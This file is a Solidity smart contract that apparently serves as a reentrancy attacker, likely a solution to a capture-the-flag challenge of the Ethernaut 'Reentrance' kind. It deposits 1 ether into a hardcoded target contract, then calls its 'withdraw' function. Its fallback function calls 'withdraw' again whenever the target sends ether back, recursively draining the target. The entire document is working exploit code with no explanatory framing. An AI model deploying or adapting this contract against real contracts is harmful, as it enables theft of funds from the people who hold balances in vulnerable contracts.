pragma solidity ^0.7.0;
contract sc{
    address public addr=0x7DF7152A41a752BdA81De74456c3d5505Ca70cc9;
    function deposit(address to) public payable{
        (bool success, bytes memory returnData)=addr.call{value: 1 ether}(abi.encodeWithSignature("donate(address)",to));
    }
    function withdrawl(uint amount) public {
        (bool success, bytes memory returnData)=addr.call(abi.encodeWithSignature("withdraw(uint256)",amount));
    }
    fallback() payable external{
        uint256 amount=1000000000000000000;
        (bool success, bytes memory returnData)=addr.call(abi.encodeWithSignature("withdraw(uint256)",amount));
    }
}